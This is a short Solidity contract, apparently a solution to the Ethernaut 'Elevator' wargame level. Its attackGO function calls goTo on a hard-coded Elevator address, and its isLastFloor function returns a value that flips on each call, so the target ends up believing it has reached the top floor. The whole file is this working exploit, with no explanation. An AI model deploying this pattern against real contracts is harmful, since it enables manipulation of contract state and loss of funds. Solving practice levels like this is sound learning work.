// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator {
  function  goTo(uint) external ;
}


contract Building {
    bool public top;
  
    Elevator ele=Elevator(0x8bdd7CcF801fb7aDdD1f6afe261E32D1A8ECAb8d);
    
    function attackGO() public{

            ele.goTo(0);

    }
    
    function isLastFloor(uint) public returns (bool){

            top=!top;
            
            return top;

    }
}